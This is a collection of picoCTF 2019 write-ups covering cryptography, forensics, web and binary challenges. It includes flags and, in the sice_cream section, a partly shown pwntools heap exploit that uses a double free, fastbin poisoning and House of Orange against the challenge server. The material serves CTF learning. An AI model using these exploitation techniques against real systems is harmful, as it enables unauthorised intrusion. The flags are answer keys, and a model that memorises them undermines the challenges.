c2 50 4e 99 33 7f 0e 3f 48 00 45 ed 75 bd 40 7b
e2 00 01 31 e6 00 fd 31 18 00 5e 51 6f a1 ec b2
e3 00 00 fc 9e be 92 1f 17 78 99 45 78 8c 37 a7
a2 10 85 0d cf b4 b4 e2 75 07 e5 49 cc a0 1d 6b
47 06 47 4f ce 04 64 1f 08 a0 e6 bc e2 08 60 01
1a 96 99 e4 7f 09 d9 aa e2 be ff 1f 18 e6 bf 02
00 33 36 cc 54 c4 3f 13 7d 2f f2 dd 7f b0 78 f8
f6 2d 5a 9c e5 c5 c2 98 f1 93 a7 a7 67 87 a6 fb
80 3f e2 90 9f 97 79 98 bf a0 af c5 1b e4 58 02
0f 45 92 06 ff 88 ff 24 bf 4f 6f 24 ae 7f f1 91
fc 18 cc 99 8e 1d 1f 82 61 5d 53 c4 04 c0 d2 07
f7 eb c2 c4 a8 1a 7d f4 a1 e7 b1 40 09 c7 af b7
1c 58 ec 3d a2 37 96 dd 0f c6 d5 2f 02 78 d9 ff
c6 e9 95 61 fc 55 e1 d5 e3 9b b4 f9 cd 23 1d 52
44 f1 83 82 f5 bb bf bd 5a bf b1 e0 18 92 f0 a4
0b 5c 7f f2 0d 4c 56 37 ba 43 07 5f a2 c5 e5 aa
fa d1 7b 61 85 f1 52 b6 84 3f 7c aa 88 59 ef 4e
6f 2b 02 e7 b7 ec a1 35 a4 08 79 c9 39 41 b7 31
bf 68 ab d2 7f d3 7e bb 7b ef 57 ec b7 82 77 72
33 1e d9 d6 79 ab 07 b5 d5 c8 7a 35 e9 d2 b7 26
bd a4 6f f9 19 c4 62 28 1f 9c cf 6d 95 5b 22 44
0c 16 ca cd 5b e0 e8 67 c9 34 8e dd 33 7c 9e 9f
7d 79 7c 42 34 27 14 e7 3e a9 b0 57 1f 9f 91 7c
3e e5 f2 33 af c1 f9 45 eb 80 a7 02 be be 7a 2d
d5 f1 a2 6e ed 9a 5b f3 31 05 ea 07 e9 ac 0c be
99 5e 5e 13 f5 23 4b 64 5a e8 2e 8e 99 96 1c bc
39 e5 e7 ea bc 2e ff 7f e9 04 1e 33 ef 49 57 17
d5 0b e3 4a f9 ee f2 e7 bd aa ff 6f af 86 00 da
e9 89 37 ca 7f 90 fe 64 fd 5d 5b 9f a5 f6 fe 00
db 5f 60 e1 bf 7d 94 78 ff a0 01 d3 02 c4 9f a4
17 92 74 37 21 b4 c6 95 be 5b 24 9e 3f 7f 02 c4
53 76 eb de f4 00 c0 00 fb 4d fe 97 8a 49 45 ff
```
If instead the key were to be `0070000000000000`, the third _column_ would begin with `3c, 42, 4e, 01`, etc.

From here, the key observation to make is that this data must represent a PNG image; we also know that a PNG must begin with the following header:
```
89 50 4e 47 0d 0a 1a 0a
```
Based on this alone, we can find that the first half of the key is `49952030`, which rotates the columns to get the header to be correct. Furthermore, we know that this header must be immediately followed by an `IHDR` chunk, which always has length `0d`. Thus, our first row must look like:
```
89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52
```
We can thus quickly find that the correct key must be of the form `49952030???75112`. The three `?`s are there because the corresponding byte (`00`) has multiple possible values (`4,5,6` for the first, `7,8,9` for the second (we can't have the two-digit `10`), and `2,3,4,5` for the third). We could brute force these possibilites, but we can reduce our search space by look at the second row. By the [spec](http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html), this corresponds to the content of the `IHDR` chunk, which must look like:
```
Width:              4 bytes
Height:             4 bytes
Bit depth:          1 byte
Color type:         1 byte
Compression method: 1 byte
Filter method:      1 byte
Interlace method:   1 byte
```
Let's see what the three `?`s must be:

- The first `?` must make the `bit depth` valid (1, 2, 4, 8, 16); the only way we can do this is having the first `? = 5`.
- The second `?` must make the `color type` valid (0, 3 based on the `bit depth`); we must have the second `? = 7,8,9`.
- The third `?` must make the `compression method` valid (0 is the only one allowed); we must have the third `? = 2,3,4`.

With only nine possibilites left, we can simply brute force the possible keys: `4995203057275112`, `4995203057375112`, `4995203057475112`, `4995203058275112`, `4995203058375112`, `4995203058475112`, `4995203059275112`, `4995203059375112`, `4995203059475112`. The last one gives us a QR code:

![QR Code](qr.png "QR Code")

The QR [decodes](https://zxing.org/w/decode.jspx) to the flag:

> `picoCTF{b7794daf95ade3c353aa8618c3a7e2c6}`


### File: picoCTF-2019-writeups/problems/aes-abc/README.md

# AES-ABC
> AES-ECB is bad, so I rolled my own cipher block chaining mechanism - Addition Block Chaining! You can find the source here: aes-abc.py. The AES-ABC flag is body.enc.ppm

> Hints:
> You probably want to figure out what the flag looks like in ECB form...

As is always the case, we begin by skimming the source code. Of interest, of course, is the encryption algorithm.
```python3
def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = "".join(blocks)
 
    return iv, ct_abc, ct
```
The top states that the encryption mode is electronic codebook (ECB), and the hint suggests that we would like to get to reverse the ciphertext into this form.

Skimming down, it uses an initialization vector ``iv`` to start off the blocks, and then it runs the following critical chain:
```python
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)
```
Essentially, it is taking the previous block and adding it directly to the current block, and then iterating this process with the next block. Note the accompanying ASCII diagram.
```
       [plain 1]            [plain 2]            [plain 3]       ...
           |                    |                    |
           | (AES ECB)          | (AES ECB)          | (AES ECB)
           V                    V                    V
       [ ECB 1 ]            [ ECB 1 ]            [ ECB 3 ]
+iv -> [ enc 1 ]   --- + -> [ enc 2 ]   --- + -> [ enc 3 ]   --- ...
```
Experienced readers may note this is pretty much the typical cipher block chaining, using addition instead of xor. We are, of course, given the ``enc`` blocks in the ``body.ppm.enc`` file, and while we can't reverse this into the original plaintext, we can at least reverse this back into ECB mode by simply subtracting out. Notice that
```
enc n = ECB n  +  enc n-1
```
where ``enc 0 = iv`` by convention. This means that we simply have
```
ECB n = enc n  -  enc n-1
```
which can be calculated easily.

We do this now. The script will output in ECB.
```python3
>>> import binascii
>>> f = open('body.enc.ppm','rb').read()[16:] # Remove the header
>>> enc_blocks = [f[i:i+16] for i in range(0,len(f),16)]
>>> enc_blocks = [int(binascii.hexlify(b),16) for b in enc_blocks]
>>> ecb_blocks = [(enc_blocks[n] - enc_blocks[n-1]) % (256**16) for n in range(1,len(enc_blocks))]
```

This will, theoretically, turn our ciphertext into the simpler ECB mode, so now we must exploit the ECB. The issue with ECB is that the same plaintext becomes the same ciphertext every time, so in cases where many plaintexts will inevitably repeated, we could guess what the plaintext corresponds to brcause it appears so frequently. Or, because it is an image being encrypted (it is ``.ppm``), we could hope that each block corresponds to one red-green-blue triple so that the same pixel will get encrypted to the same block in ciphertext, every single time.

And this wishful thinking pays off. Indeed, if one runs ``set(ecb_blocks)``, there are surprisingly few total values (in comparison to the modulus ``UMAX``), so it is likey that these do in fact correspond to individual rgb values. Skimming through ``ecb_blocks``, it is easily noticed that the value ``170711812579352817628051274266082219019`` appears far more than any other value, so we guess that this corresponds to a background color of some kind. Because of how little the other values seem to appear, we can will just pretend that this value is black, and all other values are white. (This simply makes the image crisper and makes image-creation easier.)

So we create the following image-creation function.
```python3
>>> from PIL import Image
>>> bkgd = 170711812579352817628051274266082219019
>>> def create(w, h):
...     im = Image.new('RGB', (w,h))
...     im.putdata([(0,0,0) if b==bkgd else (255,255,255) for b in ecb_blocks])
...     im.save('flags/flag' + str(w) + '.png')
```
I couldn't get the image dimensions given in the header of the ``.ppm`` to work for me, but some for loop magic does the trick. After some guessing and checking (``for i in range(1,1000):create(i,len(ecb_blocks)//i+i)``), we see the flag is especially visible for widths of length ``355`` and multiples. 
> ``picoCTF{d0Nt_r0ll_yoUr_0wN_aES}``



### File: picoCTF-2019-writeups/problems/investigation_encoded_1/README.md

# investigation_encoded_1

> We have recovered a [binary](mystery) and 1 file: [image01](output). See what you can make of it. Its also found in `/problems/investigation-encoded-1_5_c4e49003ef959a1a25e1a66ab0f30ad8` on the shell server. NOTE: The flag is not in the normal picoCTF{XXX} format.

With some experimenting, we find that this binary seems to take the contents of `flag.txt` and write some data into `output`. The data in `output` seems to be raw, and not actually an image. If we `xxd` the original `output`, we get:
```
00000000: 8e8e ba3b b8ea 23a8 ea3a a3ba e3ae 2eee  ...;..#..:......
00000010: 2eee 3a3a a2ba 3ba8                      ..::..;.
```
Let's now reverse the binary. Here's a summary of what the binary seems to do:
- `main` loads `flag.txt` and calls `encode`
- `encode` iterates through each character in the flag, gets some values from a mysterious `matrix` global variable, and calls `save(getValue())` several times
- `save` does some bitwise manipulation and will occasionally write to `./output`
- `getValue` accesses the `secret` global variable in some way, and returns a single bit
Let's now translate the whole thing into python:
```python
isValid = lambda c: (c == ' ') or ('a' <= c and c <= 'z') or ('A' <= c and c <= 'Z')
def getValue(val):
	return (secret[val/8] >> (7 - val%8)) & 1
def save(c):
	global buffChar, remain
	buffChar |= c
	if remain == 0:
		remain = 7
		output.write(chr(buffChar))
		buffChar = 0
	else:
		buffChar *= 2
		remain -= 1
def encode():
	failed = False
	for c in flag:
		if not isValid(c):
			failed = True
			break
		c = c.lower()
		if (c == ' '):
			c = '{'
		c = ord(c) - 0x61
		for i in range(matrix[2*c + 1], matrix[2*c + 1] + matrix[2*c]):
			save(getValue(i))
	if failed:
		print "Error, I don't know why I crashed"
		exit(1)
	while remain != 7:
		save(0)

flagfile = open("flag.txt","r")
flag = flagfile.read()
output = open("output","w")
global buffChar, remain
buffChar = 0
remain = 7
encode()
output.close()
print "I'm done, check ./output"
```
Now, we can see in more detail what's happening:

- `encode` iterates through each character in the flag. It converts each character into an integer `c` by mapping `a -> 0, b -> 1, ... z -> 25, [space] -> 26`. Then, for each `i` in `[matrix[2*c+1], matrix[2*c+1] + matrix[2*c])`, it calls `save(getValue(i))`. (In this way, the even indices of `matrix` correspond to the length, and the odd indices correspond to the start index.)
- `getValue` returns the `i % 8`th bit of `secret(i / 8)`.
- `save` manages a buffer of bits. When the buffer is not filled (`remain > 0`), it appends the inputted bit to the buffer. Once the buffer is filled with 8 bits (`remain = 0`), it outputs a byte into the file and clears the buffer.
- `encode` will flush the buffer in `save` with `0`'s at the end.

Thus, each character in the flag corresponds to certain sequence of bits whose size is not necessarily aligned with a byte. Based on the values of `matrix` and `secret` (see `data.txt`), we can find these sequences:
```
a : 10111000
b : 111010101000
c : 11101011101000
d : 1110101000
e : 1000
f : 101011101000
g : 111011101000
h : 1010101000
i : 101000
j : 1011101110111000
k : 111010111000
l : 101110101000
m : 1110111000
n : 11101000
o : 11101110111000
p : 10111011101000
q : 1110111010111000
r : 1011101000
s : 10101000
t : 111000
u : 1010111000
v : 101010111000
w : 101110111000
x : 11101010111000
y : 1110101110111000
z : 11101110101000
  : 0000
```
Now, we simply write a [script](solve.py) to decode and get the flag:

> `encodeddbqkjjnbfz`

Note that this problem is very similar to [investigation_encoded_2](/problems/investigation_encoded_2).


### File: picoCTF-2019-writeups/problems/investigation_encoded_2/README.md

# investigation_encoded_2

> We have recovered a [binary](mystery) and 1 file: [image01](output). See what you can make of it. Its also found in `/problems/investigation-encoded-2_1_a4cbd68ce835252282cea861a81110f8` on the shell server. NOTE: The flag is not in the normal picoCTF{XXX} format.

This problem is remarkably similar to [investigation_encoded_1](/problems/investigation_encoded_1), and we recommend reading that writeup first. Here's the translated python code:
```python
isValid = lambda c: (c == ' ') or ('a' <= c and c <= 'z') or ('A' <= c and c <= 'Z') or ('0' <= c and c <= '9')
def getValue(val):
	return (secret[val/8] >> (7 - val%8)) & 1
def save(c):
	global buffChar, remain
	buffChar |= c
	if remain == 0:
		remain = 7
		output.write(chr(buffChar))
		buffChar = 0
	else:
		buffChar *= 2
		remain -= 1
def encode():
	failed = False
	for c in flag:
		if not isValid(c):
			failed = True
			break
		c = ord(c.lower())
		if (c == ord(' ')):
			c = 0x85
		elif (ord('0') <= c) and (c <= ord('9')):
			c += 0x4b
		c -= 0x61
		if c != 36:
			c = (c+18) % 36
		for i in range(indexTable[c], indexTable[c+1]):
			save(getValue(i))
	if failed:
		print "Invalid Characters in flag.txt\n./output is corrupted"
		exit(1)
	while remain != 7:
		save(0)

flagfile = open("flag.txt","r")
flag = flagfile.read()
output = open("output","w")
global buffChar, remain
buffChar = 0
remain = 7
encode()
output.close()
print "I'm done, check ./output"
```
Compared with investigation_encoded_1, there are a few differences:

- There is a `login` function which will crash the program in the binary. For testing purposes, this can easily be bypassed in gdb by jumping over the call to `login`. This function has been omitted from the above python translation.
- Digits (`0` through `9`) are now valid flag characters. The mapping is now: `a -> 0, b -> 1, ... z -> 25, 0 -> 26, 1 -> 27, ... 9 -> 35, [space] -> 36`. Each value is additionally `rot18`'d.
- Instead of `matrix`, we have `indexTable`, for which even indices are the start of the range and odd indices are the end of the range (as opposed to length and start).

In the same manner as the previous problem, we find that each character corresponds to a sequence of bits:
```
a : 101011101110111000
b : 1010101110111000
c : 10111000
d : 10101010111000
e : 101010101000
f : 11101010101000
g : 1110111010101000
h : 111011101110101000
i : 111010101000
j : 11101011101000
k : 1110101000
l : 1010101000
m : 101000
n : 1011101110111000
o : 1010111000
p : 101010111000
q : 101110111000
r : 11101010111000
s : 1000
t : 10111010101000
u : 1011101110111011101000
v : 10111011101011101000
w : 1110101110111010111000
x : 111010111011101000
y : 11101110111010101000
z : 1110111010101110111000
0 : 1110101010111000
1 : 1110101110101110111000
2 : 10111010111010111000
3 : 111010101010111000
4 : 1011101011101000
5 : 101110101011101000
6 : 101011101110101000
7 : 1110101011101000
8 : 1110111011101110111000
9 : 10111011101110111000
  : 0000
```
Again, we write a [script](solve.py) to decode and get the flag:

> `t1m3f1i350000000000071ed4c08`


### File: picoCTF-2019-writeups/problems/john_pollard/README.md

# john_pollard
> Sometimes RSA [certificates](cert) are breakable

> Hints: The flag is in the format picoCTF{p,q}. Try swapping p and q if it does not work.

This question is pretty much reserach. After looking around for long enough for a tool to read the RSA certificates, we found that [``openssl``](http://www.gtopia.org/blog/2010/02/der-vs-crt-vs-cer-vs-pem-certificates/) can do the job. Running the command
```
openssl x509 -in cert -text -noout
```
will spit out all of the data necessary to reconstruct the RSA cryptosystem. Because the hint says that the flag will simply be the factored modulus, we only care about the following lines.
```
            Public Key Algorithm: rsaEncryption
                Public-Key: (53 bit)
                Modulus: 4966306421059967 (0x11a4d45212b17f)
                Exponent: 65537 (0x10001)
```
A public key that's only fifty-three bits is laughably brute-forcable by [online calculators](https://www.alpertron.com.ar/ECM.HTM) and even thirty seconds of python scripting.
```python3
>>> n = 4966306421059967
>>> [(d, n//d) for d in range(1, int(sqrt(n))+1, 2) if n % d == 0]
[(1, 4966306421059967), (67867967, 73176001)]
```
Regardless of approach, we get a relatively painless flag.
> ``picoCTF{73176001,67867967}``



### File: picoCTF-2019-writeups/problems/like1000/README.md

# like1000
> This .tar file got tarred alot. Also available at /problems/like1000_0_369bbdba2af17750ddf10cc415672f1c.

> Hints:
> Try and script this, it'll save you alot of time

Downloading, the file, we get find that the file is named ``1000.tar``. With nothing better to do, we extract the file there, and it turns into ``999.tar``. This does not bode well, so we script it. A quick google search reveals that this can be done in python.
```python3
import tarfile

for i in range(1000,0,-1):
    tarfile.open(str(i) + '.tar').extractall()
```
After waiting for python to extract all the files, we are left with a ``flag.png``, which upon opening contains the flag.
> ``picoCTF{l0t5_0f_TAR5}``



### File: picoCTF-2019-writeups/problems/pastaAAA/README.md

# pastaAAA
> This pasta is up to no good. There MUST be something behind it.

After downloading the provided image file, there isn't much for us to do. As this is a CTF forensics problem, the easiest first check would be least significant bit steganography, so we whip out the Python Image Library.
```python3
>>> from PIL import Image
>>> def extractLSB(mask):
...     im = Image.open('ctf.png')
...     im_lsbs = im.point(lambda x : 255 // mask * (x&mask))
...     im_lsbs.save('lsb_'+bin(mask)+'.png')
...
>>> for i in range(8):
...     extractLSB(1 << i)
```
Even though any individual bit does not give a clear image, each of the last 3 bits creates an image that looks like the picoCTF logo with a difficult-to-make-out flag in the top left corner. So instead of having these bits separated, we extract all three at once, and ``extractLSB(0b111)`` has the flag in the top-left corned of the image.
> ``picoCTF{pa$ta_1s_lyf3}``



### File: picoCTF-2019-writeups/problems/picobrowser/README.md

# picobrowser

> This website can be rendered only by **picobrowser**, go and catch the flag! ``https://2019shell1.picoctf.com/problem/12255/`` ([link](https://2019shell1.picoctf.com/problem/12255/)) or http://2019shell1.picoctf.com:12255

> Hints: You dont need to download a new web browser

Recalling [Secret Agent](https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md#web-exploitation-200-secret-agent) from last year's competition, we feel like we can attempt a similar attack. While last time we were supposed to disguise ourselves as a Google use, this time we want to change the browser we are using. Connecting once with the website to ``/flag`` greets us with the following text.
> You're not picobrowser! Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36

Trying this on another browser (my Windows machine comes with Edge installed) yeilds the following.
> You're not picobrowser! Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362

As the challenge states, we're probably going to have to change something in that header to ``picobrowser``. Playing a pure extrapolation game, it looks like the browser name is appended to the end in pure plaintext. With this in mind, we try the stupidest things first and simply manually set ``User-Agent`` to ``picobrowser`` using python requests; this at least somewhat looks like the ``Chrome`` and ``Edge`` portions of the header (minus a forward slash perhaps), so this at least has some slim chance.
```python3
>>> import requests
>>> session = requests.Session()
>>> headers = {'User-Agent':'picobrowser'}
```
Now we make a get request using that header.
```python3
>>> response = session.get('https://2019shell1.picoctf.com/problem/12255/flag', headers=headers)
>>> page = response.text
>>> page[page.index('picoCTF{') : page.index('}')+1]
'picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}'
```
And so we somehow have gotten the flag.
> ``picoCTF{p1c0_s3cr3t_ag3nt_bbe8a517}``



### File: picoCTF-2019-writeups/problems/shark-on-wire-2/README.md

# shark on wire 2

> We found [this](capture.pcap) packet capture. Recover the flag that was pilfered from the network. You can also find the file in `/problems/shark-on-wire-2_0_3e92bfbdb2f6d0e25b8d019453fdbf07`.

Since its predecessor, shark on wire 1, involved following the UDP stream, that is the first step we should take to solve this. \
`Analyze -> Follow -> UDP Stream` \
\
There are 66 UDP streams total and two fake flags: \
In `udp.stream eq 6`, the stream contains `kfdsalkfsalkico{N0t_a_fLag}` \
In `udp.stream eq 7`, the stream contains `icoCTF{StaT31355e` (Note: UDP packets are stateless though this information isn't particularly relevant to solving the problem.) \
\
Unfortunately, this problem is not as simple as shark on wire 1. The flag was not simply waiting for us in the UDP stream. \
\
After searching the UDP packets, and briefly checking the TCP packets just in case, it could be concluded that the flag was not going to be 
in ascii or it would've been found. It was time to start searching for hex or decimal that could be converted into our flag. The data and checksums
of the UDP packets proved to be a dead end yet again so it was necessary to get creative with the search.\
\
What most likely tripped some people up was that the default Wireshark preferences do not include the columns necessary to solve this problem. \
\
By columns, I'm referring to these: \
![](wire3.png) \
To edit the columns, I went to \
`Edit -> Preferences -> Appearance -> Columns` \
and added `Souce port` to my list so that it looked like this: 
![](wire2.png) \
\
Applying a filter to the packets so that we are only viewing UDP packets and sorting them by source IP address in decending order looks like this: \
![](wire4.png) \
Scrolling through the source ports, we see something interesting. \
![](wire5.png) \
This is very unusual (especially considering all the packets came from the same source IP address). \
\
Isolating the source IP address, we get something that looks like this: \
![](wire6.png) \
Using just a basic decimal to ascii converter online, we find that `112` converts to `p`. Huh. We keep going and discover that `105` converts to `i` and `099` converts to `c`. We could
do this by hand and wouldn't need any tools besides Wireshark and the online converter, but I'm a lazy person so I wrote a bash script to do this for me.
```bash
#!/bin/bash 

tshark -r capture.pcap -Y "udp" -T fields -e udp.srcport -Y ip.src==10.0.0.66 > ports.txt
ARRAY=(`cat ports.txt`)
arrayindex=0
flag=""
chr() {
  printf \\$(printf '%03o' $1)
}


for i in "${ARRAY[@]}"
do
   portnum=( "${ARRAY[arrayindex]}" )
   decimalportnum=${portnum:1}
   if [[ ${decimalportnum:0:1} == "0" ]]
   then
      decimalportnum=${decimalportnum:1}
   fi
   flagchar=(`chr $decimalportnum`)
   flag+=$flagchar
   arrayindex=$((arrayindex+1))
done

echo $flag
```
Running this on our bash shell, we get the flag: \
> `picoCTF{p1LLf3r3d_data_v1a_st3g0}`


### File: picoCTF-2019-writeups/problems/sice_cream/README.md

# sice_cream

> Just pwn this [program](sice_cream) and get a flag. Connect with `nc 2019shell1.picoctf.com 5033`. [libc.so.6](libc.so.6) [ld-2.23.so](ld-2.23.so).

> Hints: Make sure to both files are in the same directory as the executable, and set `LD_PRELOAD` to the path of `libc.so.6`

We are given a stripped binary called `sice_cream` as well as two libc files: `libc.so.6` and `ld-2.23.so`. Therefore, we know we are working in GLIBC version 2.23. When running (with `LD_PRELOAD=./libc.so.6`; also make sure all three files are marked as executable), we are prompted for a name, then greeted with a four option menu: `Buy sice cream`, `Eat sice cream`, `Reintroduce yourself`, and `Exit`. Before we move on, let's also take a look at the checksec for this problem:
```
[*] '/.../sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
```
Notably, `Full RELRO` means the GOT is not writeable, which rules out quite a few attack vectors. Having `PIE` disabled is nice though, and suggests that we might need to use a fixed address of some function or global variable in our exploit. After a bit of messing around, our next logical step is to reverse the binary. With some Ghidra, `objdump`, and `gdb`, we get:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>

// note: creams is stored in memory right after name
char name[256];
char* creams[20];

// 0x400cc4
void printfile(char *filename){
	char c;
	FILE *file;
	
	file = fopen(filename,"r");
	if (file != NULL) {
		while (1) {
			c = getc(file);
			if (c == 0xff) break;
			putchar(c);
		}
	}
}

int get_num_creams() {
  int ct;
  for (ct = 0; creams[ct] != NULL; ct++) {
    if (ct > 19) {
      return -1;
    }
  }
  return ct;
}

void eat() {
	char buf[24];
	puts("Which sice cream do you want to eat?");
	printf("> ");
	read(0,buf,16);
	uint which = (uint)strtoul(buf,NULL,10);
	if (which > 19) {
		puts("Invalid index!");
		exit(-1);
	}
	// horrible, allows double free
	free(creams[which]);
	puts("Yum!");
}

void buy() {
	char buf[24];
	int num_creams = get_num_creams();
	if (num_creams < 0) {
		puts("Out of space!");
		exit(-1);
	}
	puts("How much sice cream do you want?");
	printf("> ");
	read(0,buf,16);
	uint amt = (uint)strtoul(buf,NULL,10);
	if (amt > 88) {
		puts("That\'s too much sice cream!");
		exit(-1);
	}
	char* newcream = malloc(amt);
	creams[num_creams] = newcream;
	puts("What flavor?");
	printf("> ");
	read(0,creams[num_creams],amt);
	puts("Here you go!");
}

// If name is not null-terminated (i.e. we fill all 256 chars)
// then rename() will leak creams[0]
void reintroduce() {
	puts("What\'s your name again?");
	printf("> ");
	read(0,name,256);
	printf("Ah, right! How could a forget a name like %s!\n",name);
}

void menu() {
	puts("1. Buy sice cream");
	puts("2. Eat sice cream");
	puts("3. Reintroduce yourself");
	puts("4. Exit");
}

void main() {
	int choice;
	char buf[24];
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	puts("Welcome to the Sice Cream Store!");
	puts("We have the best sice cream in the world!");
	puts("Whats your name?");
	printf("> ");
	read(0,name,256);

	while (1) {
		menu();
		printf("> ");
		read(0,buf,16);
		choice = (int)strtoul(buf,NULL,10);
		switch(choice) {
			case 1:
				buy();
				break;
			case 2:
				eat();
				break;
			case 3:
				reintroduce();
				break;
			case 4:
				puts("Too hard? ;)");
			default:
				exit(0);
		}
	}
}
```
Obviously, this is a heap exploitation problem. We also note a few things:
- We are restricted to `buy`ing pointers of fastbin size (in fact, maxing out at `0x58`).
- There is an unreferenced function at `0x400cc4` that prints out the file given by its argument.
- Eating a sice cream `free`s the respective pointer, but does not `NULL` it out in `creams`. This allows us to potentially abuse a double free.
- `name` is directly above `creams` in memory.
- If we `reintroduce` with a name of the full length `256`, we can leak the first pointer in `creams`.

Since most heap problems require a libc leak at some point, we think of ways to do this. Unfortunately, we can only allocate fastbin size chunks, which will not produce libc pointers. If only we could make a smallbin chunk...

The key observation to make from here is that `rename` lets us have total control of `256` bytes (actually `255` because of the forced `\n`) in memory. We actually _can_ make a smallbin chunk: a forged one in `name`. Of course, we wouldn't be able to free that smallbin chunk to actually get the libc pointers written in unless we controlled `creams`.

But we can in fact control `creams`! Remembering that `name` is right above `creams` in memory, we realize that we can use a  double free into fastbin forward pointer poisoning to get `malloc` to return a fake chunk in `name`, right above `creams`! Thus, we will write into `name` the following data:
```
[name]
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x00000000000000c1    0x0000000000000031
0x602110:    0x0000000000000000    0x0000000000000000
0x602120:    0x0000000000000000    0x0000000000000000
0x602130:    0x0000000000000000    0x0000000000000041
[creams]
0x602140:    ...
```
By abusing double free, we can coerce malloc into returning the chunk at `0x602130`, which in turn means we can write `0x602040` into `creams[0]`, and thus free our fake fastbin chunk by `eat`ing `0`. (The chunk in between is to pass corruption checks.) If we do this, `name` will begin like so:
```
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    <  libc pointer  >    <  libc pointer  >
```
... and reintroducing ourselves with the name `AAAAAAAABBBBBBBB` will allow us to leak libc.

From here, we might get stuck. Ideally, we would finish by using the same exploit and tricking `malloc` into returning a fake (misaligned) chunk of size `7f` right above `__malloc_hook`, then writing what we want into `__malloc_hook`. But such a chunk would be of fastbin size, and we can only allocate chunks of size up to `0x60`, so that wouldn't work.

Eventually, we remember than we are in libc 2.23, which is coincidentally the version right before an exploit called House of Orange was patched. This exploit (in a _very_ brief nutshell; see [here](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c) for more details, referring to "phase two" of the attack) allows us to call an arbitrary function by modifying the contents of a `free`'d chunk in the unsorted bin. We might consider the standard `system("/bin/sh")`; however, when this is manually tested, we notice that `system` will silently crash and do nothing. This limitation is because we are using `LD_PRELOAD`: `/bin/sh` will crash when executed with this wrong version of libc. (This issue means that any normal finish involving getting a shell probably won't work). But we recall the secret `print_file` function: we can simply call `print_file("flag.txt")`. Now that we know what to do, we give our exploit script (with useful comments):
```python
from pwn import *
import time

""" Helper methods """
def wait():
	time.sleep(0.05)
def flush():
	return p.recv(4096)

def buy(name, amt):
	p.sendline("1")
	p.recvuntil("How much sice cream do you want?")
	p.sendline(str(amt))
	p.recvuntil("What flavor?")
	p.sendline(name)
	p.recvuntil("4. Exit")
	wait()
def eat(n):
	p.sendline("2")
	p.recvuntil("Which sice cream do you want to eat?")
	p.sendline(str(n))
	p.recvuntil("4. Exit\n")
	wait()
def rename(s):
	p.sendline("3")
	p.recvuntil("What's your name again?")
	p.sendline(s)
	wait()
	return flush()

# Converts a string containing memory into a packed exploit string
def str2payload(s):
	s = s.replace("\n"," ")
	s = s.replace("\t"," ")
	# We ignore chunks ending with ":" for convenience
	mem = [x for x in s.split(" ") if x is not "" and not x[-1] == ":"]
	nums = [int(x,16) for x in mem]
	return ''.join([p64(x) for x in nums])

# Converts a leaked pointer string into an integer address
def leak2addr(s):
    if s == '':
        return -1
    bytelist = [ord(x) for x in s]
    assert len(bytelist) <= 8
    assert len(bytelist) >= 4
    lsw = bytelist[0:4]
    msw = bytelist[4:8]
    while len(msw) < 4:
    	msw.append(0)
    lsw_val = lsw[0] *1 + lsw[1] *256 + lsw[2] *256*256 + lsw[3] *256*256*256
    msw_val = msw[0] *1 + msw[1] *256 + msw[2] *256*256 + msw[3] *256*256*256
    val = lsw_val + 256*256*256*256 * msw_val
    return val

# Secret function that prints out the contents of a file given by its argument.
PRINT_FILE = 0x400cc4

""" Exploit """
# p = process('./sice_cream', env={"LD_PRELOAD": "/home/alex/CTF/sice/libc.so.6"})
p = remote('2019shell1.picoctf.com', 5033)
p.sendline("~~~~")
wait()

# Our first job is to get a libc leak. We will accomplish this by writing a fake
# fastbin chunk into name and freeing it.
m1 = """
0x602040:    0x0000000000000000    0x00000000000000c1
0x602050:    0x0000000000000000    0x0000000000000000
0x602060:    0x0000000000000000    0x0000000000000000
0x602070:    0x0000000000000000    0x0000000000000000
0x602080:    0x0000000000000000    0x0000000000000000
0x602090:    0x0000000000000000    0x0000000000000000
0x6020a0:    0x0000000000000000    0x0000000000000000
0x6020b0:    0x0000000000000000    0x0000000000000000
0x6020c0:    0x0000000000000000    0x0000000000000000
0x6020d0:    0x0000000000000000    0x0000000000000000
0x6020e0:    0x0000000000000000    0x0000000000000000
0x6020f0:    0x0000000000000000    0x0000000000000000
0x602100:    0x00000000000000c1    0x0000000000000031
